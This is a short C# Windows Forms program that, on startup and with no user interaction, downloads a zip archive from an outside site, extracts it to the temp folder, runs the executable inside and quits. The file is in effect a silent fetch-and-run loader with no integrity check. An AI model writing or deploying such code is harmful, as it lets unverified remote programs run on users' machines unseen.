using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WMC
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            startDownload();
        }

        private async void startDownload()
        {
            string url = "https://archivos.krsolution.site/APP/OFFICE_ISO/OMC.zip";
            string rutaArchivoZip = Path.Combine(Path.GetTempPath(), "OMC.zip");
            string carpetaTemporal = Path.Combine(Path.GetTempPath(), "OMC");

            await DescargarArchivoAsync(url, rutaArchivoZip);

            // Eliminar la carpeta de destino si existe
            if (Directory.Exists(carpetaTemporal))
            {
                Directory.Delete(carpetaTemporal, true);
            }

            await ExtraerArchivoAsync(rutaArchivoZip, carpetaTemporal);

            string archivoEjecutable = Path.Combine(carpetaTemporal, "OMC.exe");
            EjecutarArchivo(archivoEjecutable);
        }

        private async Task DescargarArchivoAsync(string url, string rutaArchivo)
        {
            using (var clienteWeb = new WebClient())
            {
                await clienteWeb.DownloadFileTaskAsync(new Uri(url), rutaArchivo);
            }
        }

        private async Task ExtraerArchivoAsync(string rutaArchivoZip, string carpetaDestino)
        {
            await Task.Run(() => ZipFile.ExtractToDirectory(rutaArchivoZip, carpetaDestino));
        }

        private void EjecutarArchivo(string rutaArchivo)
        {
            try
            {
                System.Diagnostics.Process.Start(rutaArchivo);
                Application.Exit();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error al ejecutar el archivo: " + ex.Message);
            }
        }
    }
}
